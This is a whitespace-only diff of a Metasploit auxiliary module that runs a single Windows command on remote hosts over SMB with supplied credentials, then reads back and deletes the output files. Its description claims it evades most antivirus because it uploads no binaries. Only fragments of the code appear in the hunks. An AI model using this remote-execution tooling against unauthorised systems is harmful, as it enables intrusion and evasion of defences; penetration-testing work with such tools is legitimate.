@@ -18,27 +18,27 @@ class Metasploit3 < Msf::Auxiliary
 
 	def initialize(info = {})
 		super(update_info(info,
-         	'Name'           => 'SMB - Execute Windows Command',
-         	'Description'    => %q{This module executes a *single* windows command on one or more hosts
-         		by authenticating over SMB and passing a dcerpc request.  Daisy chaining commands wiht '&'
-         		does not work and you shouldn't try it.  It steals code from the psexec 
-         		module so thanks very much to the author/s of that great tool.  This module is useful 
-         		because it does not need to upload any binaries to the target machine and therefore 
-         		should bypass most if not all Antivirus solutions
-	         },
+			'Name'           => 'SMB - Execute Windows Command',
+			'Description'    => %q{This module executes a *single* windows command on one or more hosts
+				by authenticating over SMB and passing a dcerpc request.  Daisy chaining commands wiht '&'
+				does not work and you shouldn't try it.  It steals code from the psexec
+				module so thanks very much to the author/s of that great tool.  This module is useful
+				because it does not need to upload any binaries to the target machine and therefore
+				should bypass most if not all Antivirus solutions
+			},
 
-	         'Author'         => [
-	         	'Royce Davis <rdavis[at]accuvant.com>',
-	         	'Twitter: <[at]R3dy__>',
-	         ],
- 
-	         'License'        => MSF_LICENSE,
-	         'References'     => [
-	         	[ 'URL', 'http://www.pentestgeek.com' ],
-	         	[ 'URL', 'http://www.accuvant.com' ],
-	         	[ 'URL', 'http://sourceforge.net/projects/smbexec/' ],
-	         ],
-	    ))
+			'Author'         => [
+				'Royce Davis <rdavis[at]accuvant.com>',
+				'Twitter: <[at]R3dy__>',
+			],
+
+			'License'        => MSF_LICENSE,
+			'References'     => [
+				[ 'URL', 'http://www.pentestgeek.com' ],
+				[ 'URL', 'http://www.accuvant.com' ],
+				[ 'URL', 'http://sourceforge.net/projects/smbexec/' ],
+			],
+		))
 
 		register_options([
 			OptString.new('SMBSHARE', [true, 'The name of a writeable share on the server', 'C$']),
@@ -46,11 +46,11 @@ class Metasploit3 < Msf::Auxiliary
 			OptString.new('RPORT', [true, 'The Target port', 445]),
 		], self.class)
 
-		deregister_options('RHOST')			
+		deregister_options('RHOST')
 	end
-	
-	
-	
+
+
+
 	#-----------------------------------
 	# This is the main controle method
 	#-----------------------------------
@@ -58,7 +58,7 @@ class Metasploit3 < Msf::Auxiliary
 		cmd = "C:\\WINDOWS\\SYSTEM32\\cmd.exe"
 		text = "\\WINDOWS\\Temp\\#{Rex::Text.rand_text_alpha(16)}.txt"
 		bat = "C:\\WINDOWS\\Temp\\#{Rex::Text.rand_text_alpha(16)}.bat"
-		
+
 		#Try and Connect to the target
 		begin
 			connect()
@@ -66,7 +66,7 @@ class Metasploit3 < Msf::Auxiliary
 			print_error("Unable to connect to the target: #{connecterror}")
 			return
 		end
-		
+
 		#Try and authenticate with given credentials
 		begin
 			smb_login()
@@ -74,20 +74,20 @@ class Metasploit3 < Msf::Auxiliary
 			print_error("Unable to authenticate with given credentials: #{autherror}")
 			return
 		end
-		
-		smbshare = datastore['SMBSHARE']	
-		begin 
+
+		smbshare = datastore['SMBSHARE']
+		begin
 			execute_command(smbshare, ip, cmd, text, bat)
 			get_output(smbshare, ip, text)
 			cleanup_after(smbshare, ip, cmd, text, bat)
-		rescue 
+		rescue
 			# Something went terribly wrong
 			return
-		end	
+		end
 	end
-	
-	
-	
+
+
+
 	#------------------------------------
 	# Executes specified Windows Command
 	#------------------------------------
@@ -103,17 +103,17 @@ class Metasploit3 < Msf::Auxiliary
 			return execerror
 		end
 	end
-	
-	
-	
-	# -----------------------------	
+
+
+
+	# ----------------------------
 	# Retrive output from command
 	#-----------------------------
 	def get_output(smbshare, ip, file)
 		begin
 			simple.connect("\\\\#{ip}\\#{smbshare}")
 			outfile = simple.open(file, 'ro')
-			output = outfile.read 
+			output = outfile.read
 			outfile.close
 			simple.disconnect("\\\\#{ip}\\#{smbshare}")
 			if output.empty?
@@ -126,7 +126,7 @@ class Metasploit3 < Msf::Auxiliary
 			return
 		end
 	end
-	
+
 
 
 	#----------------------------------------------------------------------------------
@@ -144,9 +144,9 @@ class Metasploit3 < Msf::Auxiliary
 			return cleanuperror
 		end
 	end
-	
-	
-	
+
+
+
 	#------------------------------------------------------------------------------------------------------------------------
 	# This code was stolen straight out of psexec.rb.  Thanks very much for all who contributed to that module!!
 	# Instead of uploading and runing a binary.  This method runs a single windows command fed into the #{command} paramater
@@ -267,7 +267,7 @@ class Metasploit3 < Msf::Auxiliary
 		rescue ::Exception => e
 			print_error("Error: #{e}")
 		end
-			
+
 		begin
 			#print_status("Deleting \\#{filename}...")
 			select(nil, nil, nil, 1.0)
@@ -288,5 +288,5 @@ class Metasploit3 < Msf::Auxiliary
 		simple.disconnect("IPC$")
 		simple.disconnect(smbshare)
 	end
-	
+
 end
